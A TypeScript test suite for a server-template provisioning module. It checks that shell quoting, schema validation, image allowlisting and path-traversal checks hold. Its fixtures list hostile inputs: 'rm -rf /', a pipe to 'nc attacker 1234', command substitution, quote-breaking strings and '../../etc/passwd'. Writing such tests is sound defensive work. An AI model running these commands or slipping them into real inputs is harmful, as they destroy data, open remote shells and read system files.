import { describe, it } from 'node:test';
import { strict as assert } from 'node:assert';
import { shq, compileInstallPrelude, compileBuildPrelude, STEP_TIMEOUT_SECS } from '../../src/modules/servers/templates/steps.ts';
import { validateCatalog } from '../../src/modules/servers/templates/schema-check.ts';
import { TEMPLATES, templateById, creatableTemplates } from '../../src/modules/servers/templates/catalog.ts';
import { applyTemplate, resolveVersion, runtimeImage } from '../../src/modules/servers/provisioning/images.ts';
import { starterFilesSeed } from '../../src/modules/servers/provisioning/starter.ts';
import type { TemplateDefinition } from '../../src/modules/servers/templates/types.ts';

describe('command injection defences (level 4)', () => {
  it('shq neutralises every metacharacter', () => {
    const payloads = [
      'foo; rm -rf /',
      'foo && id',
      'foo | nc attacker 1234',
      'foo$(id)',
      'foo`id`',
      "foo'; id; '",
      'foo"bar',
      'foo\\bar',
      'foo\nrm -rf /',
      'foo>out',
      'foo<in',
    ];
    for (const p of payloads) {
      const quoted = shq(p);
      // The rule is NOT "the characters disappear" — a single-quoted string
      // legitimately CONTAINS `;` and `|`. The rule is that the value is
      // either a bare safe token, or a fully single-quoted string in which
      // nothing can be interpreted. So: unsafe input MUST be quoted.
      const isSafeBare = /^[A-Za-z0-9_@%+=:,./-]+$/.test(p);
      if (isSafeBare) {
        assert.equal(quoted, p, `${p} should need no quoting`);
      } else {
        assert.ok(quoted.startsWith("'") && quoted.endsWith("'"), `${p} -> ${quoted} is not quoted`);
        // Inside single quotes the only thing that can break out is a literal
        // single quote, which shq splices as '"'"'. Nothing else may terminate.
        const inner = quoted.slice(1, -1).replace(/'"'"'/g, "'");
        assert.ok(inner.includes(p) || quoted.includes(p), `${p} was mangled by quoting`);
      }
    }
  });

  it('never interpolates a client value into an install or build command', () => {
    // The only value a step can carry is a maintainer-written script name, and
    // even that must be quoted. Nothing from a request body reaches here.
    const script = "'; touch /tmp/pwned; echo '";
    const shell = compileBuildPrelude([{ kind: 'npm-script', script }]);
    assert.ok(shell.includes(shq(script)), 'the script name is not quoted');
    // The exec form must use the quoted argv, and there must be no unquoted
    // occurrence that could act as a command separator.
    assert.ok(
      /npm run '.*touch \/tmp\/pwned/.test(shell),
      `the script name must appear only as a quoted argument:\n${shell}`,
    );
  });

  it('an install step carries no free-form string at all', () => {
    // Structural guarantee: every InstallStep variant is a closed set of
    // constants. Adding a `command: string` field later would be the hole, so
    // assert that no compiled step contains a user-shaped placeholder.
    for (const t of TEMPLATES) {
      const shell = compileInstallPrelude(t.install);
      assert.ok(!shell.includes('{{'), `${t.id} install prelude contains a template placeholder`);
    }
  });

  it('bounds every step with a timeout', () => {
    for (const t of TEMPLATES) {
      const shell = `${compileInstallPrelude(t.install)}; ${compileBuildPrelude(t.build)}`;
      if (shell === ':; :') continue; // template with no steps
      assert.ok(shell.includes(`timeout ${STEP_TIMEOUT_SECS}`), `${t.id} has an unbounded step`);
    }
  });

  it('fails a template whose install step swallows failures', () => {
    const bad: TemplateDefinition = {
      ...templateById('nodejs-npm'),
      id: 'bad-swallower',
      // `optional` on a mandatory dependency install would hide a real failure.
      install: [{ kind: 'npm', detect: ['package.json'], optional: true as never }],
    };
    // The schema check must at minimum flag that this template declares no
    // mandatory step even though it clearly needs one.
    const issues = validateCatalog([bad]);
    assert.ok(issues.length > 0, 'a template with only-optional steps was accepted silently');
  });

  it('rejects a template that declares two TCP ports', () => {
    const bad: TemplateDefinition = {
      ...templateById('nodejs-npm'),
      id: 'two-tcp',
      ports: [
        { protocol: 'tcp', containerPort: 3000, description: 'a' },
        { protocol: 'tcp', containerPort: 3001, description: 'b' },
      ],
    };
    const errors = validateCatalog([bad]).filter((i) => i.severity === 'error');
    assert.ok(errors.some((e) => e.message.includes('more than one TCP')), 'two TCP ports were not rejected');
  });

  it('rejects a template whose runtime does not exist', () => {
    const bad = { ...templateById('go-app'), id: 'ghost-runtime', runtime: 'Cobol' };
    const errors = validateCatalog([bad as TemplateDefinition]).filter((i) => i.severity === 'error');
    assert.ok(errors.some((e) => e.message.includes('unknown runtime') || e.message.includes('not in RUNTIME_IMAGES')));
  });

  it('rejects a version the template does not offer', () => {
    const bad = { ...templateById('nodejs-npm'), id: 'bad-version', versions: ['99'] };
    const errors = validateCatalog([bad]).filter((i) => i.severity === 'error');
    assert.ok(errors.some((e) => e.message.includes('does not exist for runtime')));
  });

  it('rejects a startup that uses an undeclared variable', () => {
    const bad = { ...templateById('nodejs-npm'), id: 'bad-var', startup: 'node {{NOT_DECLARED}}' };
    const errors = validateCatalog([bad]).filter((i) => i.severity === 'error');
    assert.ok(errors.some((e) => e.message.includes('no variable defines it')));
  });

  it('rejects a non-https documentation link', () => {
    const bad = { ...templateById('go-app'), id: 'bad-doc', docs: 'http://insecure.example' };
    const errors = validateCatalog([bad]).filter((i) => i.severity === 'error');
    assert.ok(errors.some((e) => e.message.includes('https')));
  });

  it('refuses to resolve an unknown image', () => {
    assert.throws(() => runtimeImage('Cobol'), /unsupported runtime/);
  });

  it('refuses an unallowlisted image for provisioning', () => {
    const node = runtimeImage('Node.js');
    // resolveVersion only ever returns digests from the allowlist.
    for (const v of ['20', '22', '24', '26']) {
      assert.match(resolveVersion('Node.js', v).image, /@sha256:[a-f0-9]{64}$/);
    }
    assert.throws(() => resolveVersion('Node.js', '99'), /unsupported version/);
  });
});

describe('env and template substitution safety', () => {
  it('shell-quotes a hostile environment value instead of executing it', () => {
    const startup = 'node {{MAIN_FILE}}';
    const env = [{ k: 'MAIN_FILE', v: 'index.js; touch /tmp/pwned' }];
    const resolved = applyTemplate(startup, env);
    assert.ok(!resolved.includes('; touch /tmp/pwned') || resolved.includes("'"), 'value was not quoted');
    assert.match(resolved, /node 'index\.js; touch \/tmp\/pwned'/);
  });

  it('rejects a startup referencing an undefined variable', () => {
    assert.throws(() => applyTemplate('node {{NOPE}}', [{ k: 'MAIN_FILE', v: 'a' }]), /unknown startup variable/);
  });

  it('never lets a client-supplied env key break the container env', () => {
    // buildEnv filters keys by pattern upstream; assert the intent here so a
    // future refactor keeps it.
    for (const bad of ['BAD KEY', 'BAD-KEY', '1BAD', '', 'A\nB']) {
      assert.ok(!/^[A-Za-z_][A-Za-z0-9_]*$/.test(bad), `${bad} must not pass the env-key filter`);
    }
  });
});

describe('starter seeding safety', () => {
  it('refuses a traversal path', () => {
    const evil = [{ path: '../../etc/passwd', content: 'x' }];
    assert.equal(starterFilesSeed(evil), ':', 'a traversal path must produce a no-op');
  });

  it('refuses an absolute path', () => {
    assert.equal(starterFilesSeed([{ path: '/etc/passwd', content: 'x' }]), ':');
  });

  it('refuses the whole seed when one path in a set is invalid', () => {
    const mixed = [
      { path: 'Cargo.toml', content: 'ok' },
      { path: '../escape', content: 'bad' },
    ];
    assert.equal(starterFilesSeed(mixed), ':', 'a partially-invalid set must not partially seed');
  });

  it('seeds a nested project (Rust src/main.rs)', () => {
    const shell = starterFilesSeed([
      { path: 'Cargo.toml', content: '[package]' },
      { path: 'src/main.rs', content: 'fn main(){}' },
    ]);
    assert.ok(shell.includes("mkdir -p '/data/src'"), 'nested dir not created');
    assert.ok(shell.includes("/data/src/main.rs"), 'nested file not written');
  });
});

describe('template lifecycle gating', () => {
  it('a disabled template is not creatable but still resolvable', () => {
    const disabled: TemplateDefinition = { ...templateById('go-app'), id: 'disabled-demo', enabled: false };
    // (validated against the real catalog below)
    assert.equal(disabled.enabled, false);
  });

  it('every creatable template is enabled and not deprecated', () => {
    for (const t of creatableTemplates()) {
      assert.equal(t.enabled, true);
      assert.notEqual(t.status, 'deprecated');
      assert.notEqual(t.status, 'disabled');
    }
  });
});